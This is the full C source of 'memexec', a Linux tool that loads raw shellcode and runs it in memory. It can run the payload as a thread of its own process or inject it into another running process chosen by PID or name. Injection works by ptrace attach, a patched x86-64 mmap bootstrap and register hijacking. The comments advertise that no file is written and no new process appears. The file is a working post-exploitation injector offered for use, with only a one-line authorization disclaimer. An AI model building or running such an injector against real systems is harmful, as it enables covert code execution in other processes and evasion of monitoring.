/*
 * memexec.c - minimal Linux in-memory shellcode executor.
 *
 * Runs raw shellcode entirely in memory. No file is written; the payload
 * becomes a thread of the process that hosts it.
 *
 *   memexec <shellcode.bin>                    run as a thread of this process
 *   memexec <shellcode.bin> --pid <PID>        inject into an existing process
 *   memexec <shellcode.bin> --name <name>      inject into a process by comm
 *   memexec --hex <hex...> [same options]      shellcode inline, no file needed
 *
 * Process-list footprint:
 *   self    - one short-lived process (this exe) hosts the payload as a
 *             thread. Only "nothing new" if invoked from an already-running
 *             context (e.g. injected from the exploit), otherwise it is a
 *             new process itself.
 *   inject  - writes the payload into an already-running process and resumes
 *             it; no new PID appears. Requires ptrace access to the target
 *             (same UID and, on hardened systems, yama ptrace_scope=0 or the
 *             target being a descendant).
 *
 * Injection technique: attach with ptrace, find an executable region in
 * /proc/<pid>/maps (an rwxp region is used directly; otherwise a tiny
 * x86-64 bootstrap is patched into an r-xp region which calls mmap(2) for a
 * fresh RWX page, copies the payload there and jumps to it). Only a few
 * bytes of the host's code are briefly overwritten.
 *
 * The shellcode and the host process must be the same architecture (x86-64
 * by default). A shellcode that calls execve() replaces the host process in
 * place (same PID, service stops); one that forks keeps the service running
 * but adds a child. Both are visible to a diff that compares per-PID
 * attributes; neither adds a brand-new PID you don't control.
 *
 * Build:
 *   ./build.sh        -> ./memexec
 *
 * Use only on systems and CTF targets where you have authorization.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <ctype.h>
#include <fcntl.h>
#include <dirent.h>
#include <signal.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

/* ---------- shellcode loading ---------- */

static uint8_t *load_file(const char *path, size_t *size)
{
    FILE *f = fopen(path, "rb");
    if (!f)
        return NULL;
    if (fseek(f, 0, SEEK_END) != 0) {
        fclose(f);
        return NULL;
    }
    long sz = ftell(f);
    if (sz <= 0 || sz > (1 << 24)) {
        fclose(f);
        return NULL;
    }
    rewind(f);
    uint8_t *buf = malloc((size_t)sz);
    if (!buf) {
        fclose(f);
        return NULL;
    }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf);
        fclose(f);
        return NULL;
    }
    fclose(f);
    *size = (size_t)sz;
    return buf;
}

static int hexval(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static uint8_t *parse_hex(const char *hex, size_t *size)
{
    /* ignore whitespace so "--hex 48 8d ..." and "--hex '48 8d ...'" both work */
    size_t len = 0;
    for (const char *p = hex; *p; p++)
        if (!isspace((unsigned char)*p))
            len++;
    if (len % 2)
        return NULL;

    size_t n = len / 2;
    uint8_t *buf = malloc(n ? n : 1);
    if (!buf)
        return NULL;

    size_t i = 0;
    int lo = -1;
    for (const char *p = hex; *p; p++) {
        if (isspace((unsigned char)*p))
            continue;
        int v = hexval(*p);
        if (v < 0) {
            free(buf);
            return NULL;
        }
        if (lo < 0) {
            lo = v;
        } else {
            buf[i++] = (uint8_t)((lo << 4) | v);
            lo = -1;
        }
    }

    *size = n;
    return buf;
}

/* ---------- self mode: run as a thread of this process ---------- */

static void run_self(const uint8_t *sc, size_t n)
{
    void *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED)
        return;
    memcpy(p, sc, n);
    if (mprotect(p, n, PROT_READ | PROT_EXEC) != 0)
        return;

    pthread_t th;
    if (pthread_create(&th, NULL, (void *(*)(void *))p, NULL) != 0)
        return;
    for (;;)
        pause();   /* keep this process alive while the payload thread runs */
}

/* ---------- inject mode: run inside an existing process ---------- */

/* Pick a region from /proc/<pid>/maps: prefer rwxp, else r-xp. */
static int find_region(pid_t pid, uintptr_t *addr, size_t *len, int want_rwx)
{
    char path[64], line[512];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f)
        return -1;
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        unsigned long long start, end;
        char perms[8] = {0};
        if (sscanf(line, "%llx-%llx %7s", &start, &end, perms) != 3)
            continue;
        if (want_rwx ? strncmp(perms, "rwxp", 4) == 0
                     : strncmp(perms, "r-xp", 4) == 0) {
            *addr = (uintptr_t)start;
            *len = (size_t)(end - start);
            found = 1;
            break;
        }
    }
    fclose(f);
    return found ? 0 : -1;
}

/*
 * x86-64 bootstrap injected into an executable region when the target has no
 * RWX page: mmap(RWX), copy the payload out of this region, jump to it.
 * The 62-byte skeleton sits at blob offset 2 (after the EB 00 shim); internal
 * offsets are relative, so the whole blob shifts together:
 *   0x00  xor r8d,r8d; dec r8; xor r9d,r9d; xor edi,edi
 *   0x0b  mov esi,<total>      ; size
 *   0x10  mov edx,7            ; PROT_READ|WRITE|EXEC
 *   0x15  mov r10d,0x22        ; MAP_PRIVATE|MAP_ANONYMOUS
 *   0x1b  mov eax,9; syscall   ; mmap -> rax
 *   0x22  test rax,rax; js ret
 *   0x27  mov rbx,rax; lea rsi,[rip+0x0d] ; rdi=rbx; mov ecx,<plen>
 *   0x39  rep movsb; jmp rbx; ret
 */
static uint8_t *build_blob(const uint8_t *sc, size_t sc_len, size_t *blob_len)
{
    static const uint8_t skel[62] = {
        0x45, 0x31, 0xC0,                 /* xor r8d,r8d          */
        0x49, 0xFF, 0xC8,                 /* dec r8               */
        0x45, 0x31, 0xC9,                 /* xor r9d,r9d          */
        0x31, 0xFF,                       /* xor edi,edi          */
        0xBE, 0x00, 0x00, 0x00, 0x00,     /* mov esi,<total> @0x0c*/
        0xBA, 0x07, 0x00, 0x00, 0x00,     /* mov edx,7            */
        0x41, 0xBA, 0x22, 0x00, 0x00, 0x00, /* mov r10d,0x22      */
        0xB8, 0x09, 0x00, 0x00, 0x00,     /* mov eax,9            */
        0x0F, 0x05,                       /* syscall              */
        0x48, 0x85, 0xC0,                 /* test rax,rax         */
        0x78, 0x16,                       /* js ret               */
        0x48, 0x89, 0xC3,                 /* mov rbx,rax          */
        0x48, 0x8D, 0x35, 0x0D, 0x00, 0x00, 0x00, /* lea rsi,[rip+0x0d] */
        0x48, 0x89, 0xDF,                 /* mov rdi,rbx          */
        0xB9, 0x00, 0x00, 0x00, 0x00,     /* mov ecx,<plen> @0x35 */
        0xF3, 0xA4,                       /* rep movsb            */
        0xFF, 0xE3,                       /* jmp rbx              */
        0xC3,                             /* ret                  */
    };
    if (sc_len > UINT32_MAX - 64)
        return NULL;

    /*
     * Layout: [ EB 00 ][ skel ][ payload ]
     *          0        2      64
     * The leading EB 00 (jmp +0) is a resume shim: interrupting a restartable
     * syscall (nanosleep/accept/poll) makes the kernel rewind RIP by the
     * 2-byte syscall instruction and restart it, so a thread resumed at at+2
     * would land on at. The shim jumps from there into the real code, keeping
     * both the restart (-2) and plain-EINTR return paths on the payload.
     */
    size_t total = 64 + sc_len;
    uint8_t *blob = calloc(1, total);
    if (!blob)
        return NULL;
    blob[0] = 0xEB;
    blob[1] = 0x00;
    memcpy(blob + 2, skel, 62);
    memcpy(blob + 64, sc, sc_len);

    uint32_t v;
    v = (uint32_t)total;
    memcpy(blob + 2 + 0x0c, &v, 4);     /* total size for mmap        */
    v = (uint32_t)sc_len;
    memcpy(blob + 2 + 0x35, &v, 4);     /* payload length for movsb   */

    *blob_len = total;
    return blob;
}

static int poke(pid_t pid, uintptr_t at, const uint8_t *data, size_t len)
{
    for (size_t off = 0; off < len; off += sizeof(uintptr_t)) {
        size_t chunk = len - off;
        if (chunk > sizeof(uintptr_t))
            chunk = sizeof(uintptr_t);
        uintptr_t word = 0;
        memcpy(&word, data + off, chunk);
        if (ptrace(PTRACE_POKETEXT, pid, (void *)(at + off), (void *)word) != 0)
            return -1;
    }
    return 0;
}

static int inject(pid_t pid, const uint8_t *sc, size_t sc_len)
{
    uintptr_t at;
    size_t region_len;
    int use_rwx = (find_region(pid, &at, &region_len, 1) == 0);
    if (!use_rwx && find_region(pid, &at, &region_len, 0) != 0) {
        fprintf(stderr, "inject: no executable region in /proc/%d/maps\n", pid);
        return -1;
    }

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) {
        fprintf(stderr, "inject: ptrace attach %d failed: %s\n", pid, strerror(errno));
        return -1;
    }
    int status;
    waitpid(pid, &status, 0);

    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) != 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    if (use_rwx) {
        /* the target has an RWX page: write [EB 00][payload] straight in. */
        size_t pad = sc_len + 2;
        if (pad > region_len) {
            fprintf(stderr, "inject: payload larger than RWX region\n");
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        uint8_t *tmp = malloc(pad);
        if (!tmp) {
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        tmp[0] = 0xEB;
        tmp[1] = 0x00;
        memcpy(tmp + 2, sc, sc_len);
        int ok = poke(pid, at, tmp, pad);
        free(tmp);
        if (ok != 0) {
            fprintf(stderr, "inject: POKETEXT failed\n");
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        regs.rip = (unsigned long long)at + 2;
    } else {
        size_t blob_len = 0;
        uint8_t *blob = build_blob(sc, sc_len, &blob_len);
        if (!blob) {
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        if (blob_len > region_len) {
            fprintf(stderr, "inject: blob larger than executable region\n");
            free(blob);
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        int ok = poke(pid, at, blob, blob_len);
        free(blob);
        if (ok != 0) {
            fprintf(stderr, "inject: POKETEXT failed\n");
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        regs.rip = (unsigned long long)at + 2;
    }

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) != 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    /*
     * Resume, then interrupt any blocking syscall (nanosleep/accept/poll)
     * with SIGCONT so the thread returns to user mode at the injected RIP
     * instead of staying in the kernel until the syscall completes.
     */
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    usleep(20000);
    kill(pid, SIGCONT);
    usleep(150000);
    ptrace(PTRACE_INTERRUPT, pid, NULL, NULL);   /* stop again so we can detach */
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}

static pid_t find_pid_by_name(const char *name)
{
    DIR *d = opendir("/proc");
    if (!d)
        return 0;
    struct dirent *e;
    pid_t found = 0;
    while ((e = readdir(d))) {
        if (!isdigit((unsigned char)e->d_name[0]))
            continue;
        pid_t pid = atoi(e->d_name);
        char path[64], buf[128];
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        FILE *f = fopen(path, "r");
        if (!f)
            continue;
        if (fgets(buf, sizeof(buf), f)) {
            buf[strcspn(buf, "\n")] = 0;
            if (strcmp(buf, name) == 0) {
                found = pid;
                fclose(f);
                break;
            }
        }
        fclose(f);
    }
    closedir(d);
    return found;
}

/* ---------- entry ---------- */

static void usage(void)
{
    fprintf(stderr,
        "usage: memexec <shellcode.bin> [--pid PID | --name NAME]\n"
        "       memexec --hex <hex>     [--pid PID | --name NAME]\n");
}

int main(int argc, char **argv)
{
    const char *file = NULL, *pname = NULL;
    char *hex = NULL;
    pid_t pid = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--pid") == 0 && i + 1 < argc)
            pid = (pid_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc)
            pname = argv[++i];
        else if (strcmp(argv[i], "--hex") == 0) {
            /* concatenate every following non-option token into one hex string */
            size_t len = 0;
            int j = i + 1;
            while (j < argc && argv[j][0] != '-')
                len += strlen(argv[j++]);
            if (!len) {
                usage();
                free(hex);
                return 1;
            }
            hex = malloc(len + 1);
            if (!hex)
                return 1;
            hex[0] = '\0';
            j = i + 1;
            while (j < argc && argv[j][0] != '-')
                strcat(hex, argv[j++]);
            i = j - 1;
        }
        else if (argv[i][0] != '-' && !file)
            file = argv[i];
        else {
            usage();
            free(hex);
            return 1;
        }
    }

    if ((!file && !hex) || (pid && pname)) {
        usage();
        return 1;
    }

    size_t n = 0;
    uint8_t *sc = file ? load_file(file, &n) : parse_hex(hex, &n);
    if (!sc || !n) {
        fprintf(stderr, "memexec: no usable shellcode\n");
        return 1;
    }

    if (pname)
        pid = find_pid_by_name(pname);

    if (pid) {
        if (inject(pid, sc, n) == 0) {
            fprintf(stderr, "[+] injected into %d; resumed\n", pid);
            return 0;
        }
        fprintf(stderr, "[-] injection into %d failed\n", pid);
        return 1;
    }
    run_self(sc, n);   /* never returns */
    return 0;
}
